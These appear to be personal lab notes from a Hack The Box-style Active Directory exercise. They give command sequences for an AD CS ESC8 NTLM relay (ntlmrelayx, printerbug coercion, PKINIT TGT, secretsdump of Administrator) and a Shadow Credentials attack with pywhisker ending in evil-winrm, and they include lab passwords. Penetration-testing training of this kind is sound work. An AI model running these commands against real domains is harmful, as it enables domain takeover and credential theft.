## AD CS NTLM Relay Attack (ESC8)

```shell
3kjS@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

```shell
3kjS@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

```shell
3kjS@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools 
3kjS@htb[/htb]$ python3 -m venv .venv 
3kjS@htb[/htb]$ source .venv/bin/activate 
3kjS@htb[/htb]$ pip3 install -r requirements.txt
```

**Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```shell
3kjS@htb[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git
```

```shell
3kjS@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

```shell
3kjS@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache 
3kjS@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```
## Shadow Credentials (msDS-KeyCredentialLink)
![[Pasted image 20260511163648.png]]

```shell
3kjS@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

```shell
3kjS@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

```shell
3kjS@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache 3kjS@htb[/htb]$ klist
```

```shell
3kjS@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
